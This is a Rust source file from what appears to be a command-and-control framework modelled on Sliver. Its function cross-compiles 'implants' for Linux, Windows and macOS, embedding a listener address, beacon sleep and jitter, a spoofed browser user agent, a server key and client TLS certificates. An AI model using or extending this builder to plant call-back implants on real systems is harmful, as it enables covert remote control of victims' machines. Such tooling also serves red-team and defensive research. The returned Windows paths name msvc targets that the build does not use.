use log::{error, info};
use std::env;
use std::io::{Error, ErrorKind};
use std::process::Command;
use std::str::from_utf8;
use url::Url;

use crate::{
    server::{
        certs::https::create_client_certs,
        db,
    },
    utils::fs::{get_app_dir, read_file},
};

/// Generate an implant
/// References:
/// - https://github.com/BishopFox/sliver/blob/master/server/generate/binaries.go#L325
pub fn generate(
    db_path: String,
    name: String,
    listener_url: String,
    os: String,
    arch: String,
    format: String,
    sleep: u64,
    jitter: u64,
) -> Result<(String, Vec<u8>), Error> {
    info!("Generating an implant...");

    let parsed_url = Url::parse(&listener_url).unwrap();
    let proto = parsed_url.scheme();
    let host = parsed_url.host().unwrap();
    let port = parsed_url.port().unwrap();

    // Additional options
    let user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0";

    // Use Diffie-Hellman key exchange for secure comminucation
    let server_public_key = match db::get_keypair(db_path.to_string()) {
        Ok((_, p)) => p,
        Err(e) => {
            return Err(
                Error::new(
                    ErrorKind::NotFound,
                    format!("Public key not found: {:?}", e),
                ));
        }
    };

    // If the protocol is `https`, set the certificates values (root cert, client certs)
    let mut https_root_cert = String::new();
    let mut https_client_cert = String::new();
    let mut https_client_key = String::new();
    if proto == "https" {
        // Get the root CA cert only (not the private key)
        let root_cert = read_file("server/root_cert.pem".to_string())?;
        https_root_cert = String::from_utf8(root_cert).unwrap();
        (https_client_cert, https_client_key) = create_client_certs();
    }
    unsafe {
        env::set_var("fusion_HTTPS_ROOT_CERT", https_root_cert.to_string());
        env::set_var("fusion_HTTPS_CLIENT_CERT", https_client_cert.to_string());
        env::set_var("fusion_HTTPS_CLIENT_KEY", https_client_key.to_string());

        // Set environment variables for `config.rs` when building an implant.
        env::set_var("fusion_LPROTO", proto.to_string());
        env::set_var("fusion_LHOST", host.to_string());
        env::set_var("fusion_LPORT", port.to_string());
        env::set_var("fusion_SLEEP", sleep.to_string());
        env::set_var("fusion_JITTER", jitter.to_string());
        env::set_var("fusion_USER_AGENT", user_agent.to_string());
        env::set_var("fusion_PUBLIC_KEY", server_public_key.to_string());
        env::set_var("OUT_DIR", "implants/src".to_string());
    }
    let outdir = format!("{}/implants/{}", get_app_dir(), name.to_string());


    let (cmd, args, outfile) = match (os.as_str(), arch.as_str(), format.as_str()) {
        ("linux", "amd64", "elf") => {
            (
                "cargo",
                [
                    "build",
                    "--manifest-path=implants/Cargo.toml",
                    "--target",
                    "x86_64-unknown-linux-gnu",
                    "--target-dir",
                    outdir.as_str(),
                    "--release"
                ],
                format!("implants/{}/x86_64-unknown-linux-gnu/release/implant", name.to_string()),
            )
        }
        ("linux", "i686", "elf") => {
            (
                "cargo",
                [
                    "build",
                    "--manifest-path=implants/Cargo.toml",
                    "--target",
                    "i686-unknown-linux-gnu",
                    "--target-dir",
                    outdir.as_str(),
                    "--release"
                ],
                format!("implants/{}/i686-unknown-linux-gnu/release/implant", name.to_string()),
            )
        }
        ("windows", "amd64", "exe") => {
            (
                "cargo",
                [
                    "build",
                    "--manifest-path=implants/Cargo.toml",
                    "--target",
                    "x86_64-pc-windows-gnu",
                    "--target-dir",
                    outdir.as_str(),
                    "--release"
                ],
                format!("implants/{}/x86_64-pc-windows-msvc/release/implant.exe", name.to_string()),
            )
        }
        ("windows", "i686", "exe") => {
            (
                "cargo",
                [
                    "build",
                    "--manifest-path=implants/Cargo.toml",
                    "--target",
                    "i686-pc-windows-gnu",
                    "--target-dir",
                    outdir.as_str(),
                    "--release"
                ],
                format!("implants/{}/i686-pc-windows-msvc/release/implant.exe", name.to_string()),
            )
        }
        ("macos", "arm64", "macho") => {
            (
                "cargo",
                [
                    "build",
                    "--manifest-path=implants/Cargo.toml",
                    "--target",
                    "aarch64-apple-darwin",
                    "--target-dir",
                    outdir.as_str(),
                    "--release"
                ],
                format!("implants/{}/aarch64-apple-darwin/release/implant", name.to_string()),
            )
        }
        ("macos", "amd64", "macho") => {
            (
                "cargo",
                [
                    "build",
                    "--manifest-path=implants/Cargo.toml",
                    "--target",
                    "x86_64-apple-darwin",
                    "--target-dir",
                    outdir.as_str(),
                    "--release"
                ],
                format!("implants/{}/x86_64-apple-darwin/release/implant", name.to_string()),
            )
        }
        _ => {
            return Err(Error::new(ErrorKind::Other, "Invalid options."));
        }
    };

    let output = Command::new(cmd)
        .args(args)
        .output();

    match output {
        Ok(o) => {
            if o.status.success() {
                let target = args.windows(2)
                    .find(|pair| pair[0] == "--target")
                    .map(|pair| pair[1].to_string())
                    .unwrap_or_else(|| "unknown".to_string());

                let extension = if format == "exe" { ".exe" } else { "" };
                let path = format!("{}/{}/release/implant{}", outdir.as_str(), target, extension)
                    .replace("\\", "/");
                info!("Generation Success: {}", path);
                let buffer = read_file(path)?;
                Ok((outfile.to_string(), buffer))
            } else {
                error!("Generation Error: {:#?}", from_utf8(&o.stderr).unwrap());
                Err(Error::new(ErrorKind::Other, "Failed to generate an implant."))
            }
        }
        Err(e) => {
            error!("{:#?}", e);
            Err(e)
        }
    }
}